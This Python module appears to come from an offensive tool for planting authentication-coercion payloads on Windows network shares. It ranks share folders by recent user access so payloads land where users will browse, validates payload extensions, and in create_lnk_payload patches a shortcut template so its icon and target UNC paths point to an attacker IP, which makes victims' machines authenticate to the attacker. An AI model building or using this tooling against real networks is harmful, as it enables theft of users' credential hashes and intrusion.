"""
Author: George Hamilton
Description: This module is used to rank and filter the optimal share locations for deploying
payloads that coerce authentication based on recent access. This module can then be used to bulk
deploy multiple types of payloads to the identified locations. Lastly, this module can be used to
bulk cleanup multiple types of payloads from the identified locations.
"""

from datetime import datetime, timedelta
from pathlib import Path
import logging
import linksiren.target


def process_targets(unc_paths: list):
    """
    Processes a list of UNC paths and groups them by host.
    Args:
        unc_paths (list): A list of UNC paths to be processed.
    Returns:
        list: A list of HostTarget objects, each containing a host and its associated paths.
    Example:
        unc_paths = [
            '\\\\host1\\path1',
            '\\\\host1\\path2',
            '\\\\host2\\path1'
        ]
        targets = process_targets(unc_paths)
        # targets will contain HostTarget objects with grouped paths by host.
    """
    targets = []
    for unc_path in unc_paths:
        host, path = parse_target(unc_path)

        target_handled = False
        for target in targets:
            if target.host == host:
                target.add_path(path=path)
                target_handled = True
                break

        if target_handled is False:
            targets.append(linksiren.target.HostTarget(host=host, paths=[path]))

    return targets


def parse_target(unc_path: str):
    """
    Parses a UNC (Universal Naming Convention) path to extract the host and the path.
    Args:
        unc_path (str): The UNC path to be parsed. It should be in the format
        '\\\\host\\path\\to\\resource'.
    Returns:
        tuple: A tuple containing the host and the path. The host is the third element in the
               split path, and the path is the remaining elements joined by backslashes.
    """
    host = unc_path.split("\\")[2]
    path = "\\".join(unc_path.split("\\")[3:])

    return host, path


def is_valid_payload_name(payload_name, available_extensions):
    """
    is_valid_payload_name(payload_name, available_extensions)

    :param str payload_name: A potential name for payloads
    :param list available_extensions: A list of supported payload extensions (without the .)

    :return: A bool indicateing whether or not the payload name is valid.

    Accepts a potential payload name. Validates the payload name has an extension and that the
    extension is supported. Returns True if the payload name is valid or False if it is not.
    """
    logger = logging.getLogger("main_logger")
    invalid_payload_message = (
        "Invalid payload extension provided. Payload must end in one of the" "following:\n\t"
    )

    for available_extension in available_extensions:
        invalid_payload_message = invalid_payload_message + (f"{available_extension}\t")

    payload_extension = Path(payload_name).suffix
    if payload_extension not in available_extensions:
        logger.error(invalid_payload_message, extra={"path": payload_name})
        print(invalid_payload_message + f"\n\tProvided Extension: {payload_extension}")
        is_valid = False
    else:
        is_valid = True

    return is_valid


def create_lnk_payload(attacker_ip, template_bytes):
    """
    create_lnk(attacker_ip, payload_name)

    This function generates a Windows shortcut (.lnk) file with a specified icon and target UNC
    path and returns the contents as bytes.

    :param attacker_ip (str): The IP address of the attacker's machine.
    :param payload_name (str): The desired name of the output shortcut file.

    :return: Returns bytes if the lnk file is successfully created; otherwise, returns False.

    The function creates a shortcut file by injecting the attacker's IP address into a provided lnk
    template. It sets the icon file UNC path and the target UNC path in the lnk file to the
    provided attacker's IP. If the resulting path names exceed the maximum tested length of 238
    characters, the function prints a message and returns False. Otherwise, it returns the content
    of the generated shortcut file as bytes.
    """
    img_unc_offset = 0x16D  # Offset to the icon file unc path in the template
    target_unc_offset = 0x931  # Offset to the target for the lnk file in the template
    max_path = 239  # Max tested length is 238

    img_unc_path = f"\\\\{attacker_ip}\\test.ico"
    target_unc_path = f"\\\\{attacker_ip}\\test"

    logger = logging.getLogger("main_logger")

    if len(img_unc_path) >= max_path or len(target_unc_path) >= max_path:
        logger.error(
            "Length of the image UNC path (%s) is greater than the maximum of %d.",
            img_unc_path,
            max_path,
        )
        return False

    img_unc_path = (img_unc_path + "\x00").encode("utf-16le")
    target_unc_path = (target_unc_path + "\x00").encode("utf-16le")

    payload_bytes = template_bytes

    for i, char in enumerate(img_unc_path):
        payload_bytes[img_unc_offset + i] = char

    for i, char in enumerate(target_unc_path):
        payload_bytes[target_unc_offset + i] = char

    return bytes(payload_bytes)


def compute_threshold_date(current_date, theshold_length):
    """
    Computes the threshold date by subtracting a given number of days from the current date.

    Args:
        current_date (datetime.date): The current date.
        theshold_length (int): The number of days to subtract from the current date.

    Returns:
        datetime.date: The computed threshold date.
    """
    threshold_date = current_date - timedelta(days=theshold_length)
    return threshold_date


def is_active_file(threshold_date, access_time):
    """
    Determines if a file is active based on its last access time.

    Args:
        threshold_date (datetime): The date to compare the file's access time against.
        access_time (float): The last access time of the file, represented as a Unix timestamp.

    Returns:
        bool: True if the file's access time is greater than or equal to the threshold date,
        False otherwise.
    """
    access_time = datetime.fromtimestamp(access_time)
    return access_time >= threshold_date


def sort_rankings(folder_rankings):
    """
    Sorts the given dictionary of folder rankings in descending order based on their values.

    Args:
        folder_rankings (dict): A dictionary where the keys are folder names and the values are
        their rankings.

    Returns:
        dict: A new dictionary with the folder rankings sorted in descending order by their values.
              If the input is None, returns an empty dictionary.
    """
    if folder_rankings is None:
        sorted_rankings = {}
    else:
        sorted_rankings = dict(
            sorted(folder_rankings.items(), key=lambda item: item[1], reverse=True)
        )
    return sorted_rankings


def filter_targets(targets, sorted_rankings, max_folders_per_target):
    """
    filter_targets(targets, sorted_rankings, max_folders_per_target)

    :param list targets: List of UNC paths to shares and base directories to review.
    :param dict sorted_rankings: A dictionary in the format {<folder UNC path>: <ranking>} sorted
    by ranking.
    :param int max_folders_per_target: Number of deployment targets to output per supplied
    target.

    :return: A list of UNC paths for payload deployemnt. This contains at most
    max_folders_per_target deployment targets for each supplied target share or folder.

    Accepts a list of target shares or folders supplied by the user, a dictionary sorted by ranking
    of each potential deployment target and its ranking, and a maximum number of deployment targets
    per supplied target. Returns a list of deployment targets.
    """
    filtered_rankings = []

    # For each share target in the list
    for target in targets:
        # Get paths from sorted rankings associated with the target
        matching_paths = [
            key
            for key in sorted_rankings.keys()
            if f"\\\\{target.host}\\" == key[: 2 + len(target.host) + 1]
        ]

        # Sort the matching share paths based on their ranking in descending order
        # and subsorted by key in alphabetical order. Keep only the top N.
        sorted_matching_paths = sorted(matching_paths, key=lambda key: (-sorted_rankings[key], key))

        # Keep only the top N
        top_matching_paths = sorted_matching_paths[:max_folders_per_target]

        filtered_rankings.extend(top_matching_paths)

    return sorted(filtered_rankings)
